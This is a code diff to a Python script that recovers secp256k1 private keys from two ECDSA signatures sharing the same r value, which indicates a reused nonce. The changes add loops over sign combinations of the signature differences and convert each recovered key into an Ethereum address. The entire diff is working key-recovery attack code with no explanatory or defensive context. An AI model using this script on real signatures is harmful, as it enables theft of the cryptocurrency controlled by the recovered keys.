@@ -57,7 +57,8 @@ def inverse_mod( a, m ):
     else: return ud + m
 
 import ecdsa
-import sha3
+import ethereum
+import binascii
 
 n = ecdsa.SECP256k1.order
 
@@ -75,26 +76,28 @@ z2 = int('0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009', 0
 if r1 == r2:
     print("Vulnerable")
 
-z = z2 - z1
-s = s2 - s1
-r_inv = inverse_mod(r1, n)
-s_inv = inverse_mod(s, n)
-k = (z * s_inv) % n
+z_options = [
+    z2 - z1,
+    z1 - z2,
+    z1 + z2,
+    - z1 - z2
+]
+s_options = [
+    s2 - s1,
+    s1 - s2,
+    s1 + s2,
+    - s1 - s2,
+]
 
-print("k = {}".format(k))
+for z in z_options: 
+    for s in s_options:
+        r_inv = inverse_mod(r1, n)
+        s_inv = inverse_mod(s, n)
+        k = (z * s_inv) % n
 
-pk1 = ((s1 * k) % n - z1) * inverse_mod(r1, n) % n
-pk2 = ((s2 * k) % n - z2) * inverse_mod(r2, n) % n
+        pk1 = ((s1 * k) % n - z1) * inverse_mod(r1, n) % n
+        pk2 = ((s2 * k) % n - z2) * inverse_mod(r2, n) % n
 
-print("pk1 = {}".format(hex(pk1)))
-print("pk2 = {}".format(hex(pk2)))
-
-# pk = ecdsa.SigningKey.from_string(hex(pk1))
-# pk_bytes = pk.to_string()
-
-import ethereum
-import binascii
-
-addr = ethereum.utils.privtoaddr(pk1)
-print("addr = {}".format(binascii.hexlify(addr)))
+        addr = ethereum.utils.privtoaddr(pk1)
+        print("addr = {}".format(binascii.hexlify(addr)))
 
